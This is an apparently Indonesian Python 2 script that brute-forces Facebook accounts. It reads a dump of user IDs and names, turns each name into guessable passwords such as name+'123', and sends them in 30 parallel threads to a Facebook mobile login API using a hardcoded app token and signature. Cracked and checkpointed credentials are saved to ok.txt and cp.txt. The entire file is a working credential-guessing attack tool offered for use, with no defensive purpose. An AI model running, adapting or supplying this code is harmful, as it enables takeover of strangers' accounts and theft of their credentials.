#!usr/bin/python2.7
# coding=utf-8
import requests, json, sys, os, re, time
from multiprocessing.pool import ThreadPool as th
from datetime import datetime

class Brute:
	

    def __init__(self):
        self.setpw = False
        self.ok = []
        self.cp = []
        self.loop = 0

    def bruteRequest(self, username, password):
        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
           'format': 'JSON', 
           'sdk_version': '2', 
           'email': username, 
           'locale': 'en_US', 
           'password': password, 
           'sdk': 'ios', 
           'generate_session_cookies': '1', 
           'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
        try:
            os.mkdir('out')
        except:
            pass

        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if re.search('(EAAA)\\w+', response.text):
        	#print '\r\x1b[1;92m [Succesfull] '+ username + ' ◊ ' + password
            self.ok.append(username + ' ◊ ' + password)
            save = open('out/ok.txt', 'a')
            save.write(str(username) + ' ◊ ' + str(password) + '\n')
            save.close()
            return True
        else:
            if 'www.facebook.com' in response.json()['error_msg']:
            	#print '\r \x1b[1;93m[Checkpoint] '+ username+' ◊ '+ password
                self.cp.append(username + ' ◊ ' + password)
                save = open('out/cp.txt', 'a')
                save.write(str(username) + ' ◊ ' + str(password) + '\n')
                save.close()
                return True
            return False

    def brute(self, users):
        if self.setpw == False:
            self.loop += 1
            for pw in users['pw']:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                sys.stdout.write(('\r\x1b[1;97m [\x1b[1;97m{}\x1b[1;97m*] Crack {}/{}\x1b[1;92m OK\x1b[1;97m:\x1b[1;92m{}\x1b[1;93m CP\x1b[1;97m:\x1b[1;93m{} \x1b[1;97m').format(datetime.now().strftime(''), self.loop, len(self.target), len(self.ok), len(self.cp)))
                sys.stdout.flush()

        else:
            self.loop += 1
            for pw in self.setpw:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                sys.stdout.write(('\r\x1b[1;97m [\x1b[1;97m{}\x1b[1;97m*] Crack {}/{}\x1b[1;92m OK\x1b[1;97m:\x1b[1;92m{}\x1b[1;93m CP\x1b[1;97m:\x1b[1;93m{} \x1b[1;97m').format(datetime.now().strftime(''), self.loop, len(self.target), len(self.ok), len(self.cp)))
                sys.stdout.flush()

    def main(self):
    	os.system('clear')
        print'\x1b[1;95m• \x1b[1;92mrom.py \n\x1b[1;93m          _____ __________   _____ \n         /     \\\\______   \\_/ ____\\ \n        /  \\ /  \\|    |  _/\\   __\\  \n       /    Y    \\    |   \\ |  |   \n       \\____|__  /______  / |__|   \n               \\/       \\/      \n         [ github.com/Mark-Zuck ] '
        print '\x1b[1;97m════════════════════════════════════════════════'
        os.system("echo -e ' [•] Masukan Hasil Output Yang Anda Dump Tadi  '| lolcat")
        while True:
            file = raw_input('\x1b[1;97m [*] Contoh Hasil Dump :\x1b[1;93m dump/xnxx.json\n \x1b[1;97m[?] Output Dump Tadi  :\x1b[1;93m ')
            try:
                list = open(file, 'r').read()
                object = json.loads(list)
                break
            except IOError:
                print '\n\x1b[1;91m File \x1b[1;92m%s\x1b[1;91m Tidak Ada!' % file
                os.system('exit')

        self.target = []
        for user in object:
            try:
                obj = user['name'].split(' ')
                if len(obj) == 1:
                    listpass = [obj[0] + '123', obj[0] + '1234',
                     obj[0] + '12345']
                elif len(obj) == 2:
                    listpass = [obj[0] + '123', obj[0] + '12345',
                     obj[1] + '123', obj[1] + '12345']
                elif len(obj) == 3:
                    listpass = [obj[0] + '123', obj[0] + '12345',
                     obj[1] + '123', obj[1] + '12345',
                     obj[2] + '123', obj[2] + '12345']
                elif len(obj) == 4:
                    listpass = [obj[0] + '123', obj[0] + '12345',
                     obj[1] + '123', obj[1] + '12345',
                     obj[2] + '123', obj[2] + '12345',
                     obj[3] + '123', obj[3] + '12345']
                else:
                    listpass = ['sayang', 'anjing',
                     'bangsat', 'kontol','bismillah',
                     'cantik']
                self.target.append({'id': user['uid'], 'pw': listpass})
            except:
                pass

        if len(self.target) == 0:
            exit('\x1b[1;91m Id Tidak ditemukan dalam file\x1b[1;97m [\x1b[1;92m %s \x1b[1;97m]' % file)
        ask = raw_input("\x1b[1;97m [?] Password default/manual [d/m] :\x1b[1;93m ")
        print''
        print('\x1b[1;97m════════════════════════════════════════════════');time.sleep(0.07)
        if ask.lower() == 'm':
            while True:
            	print (" \x1b[1;97m[•] Gunakan Tanda (\x1b[1;92m,\x1b[1;97m) koma untuk pemisah ");time.sleep(0.07)
                print (' \x1b[1;97m[*] Contoh : \x1b[1;93msayang\x1b[1;92m,\x1b[1;93mpengen\x1b[1;92m,\x1b[1;93mngentot ');time.sleep(0.07)
                self.setpw = raw_input('\x1b[1;97m [?] Masukan Password :\x1b[1;93m ').strip().split(',')
                print''
                print('\x1b[1;97m════════════════════════════════════════════════');time.sleep(0.07)
                if self.setpw[0] != '':
                    break

        th(30).map(self.brute, self.target)
        self.results()
        exit()

    def results(self):
        if len(self.ok) != 0:
            print '\n\n\x1b[1;92m Succesfull ' + str(len(self.ok))
            for i in self.ok:
                print '\x1b[1;92m [Succesfull] ' + str(i) 

            print '\x1b[1;97m Account Succesfull Tersimpan Di :\x1b[1;92m ok.txt'
        if len(self.cp) != 0:
            print '\n\n\x1b[1;93m Checkpoint ' + str(len(self.cp))
            for i in self.cp:
                print '\x1b[1;93m [Checkpoint] ' + str(i) 

            print '\x1b[1;97m Account Checkpoint Tersimpan Di :\x1b[1;93m cp.txt'
        if len(self.cp) == 0 and len(self.ok) == 0:
            print '\n\x1b[1;91m Tidak Mendapatkan Hasil \n'
# Awokawokawok Ngerekod:v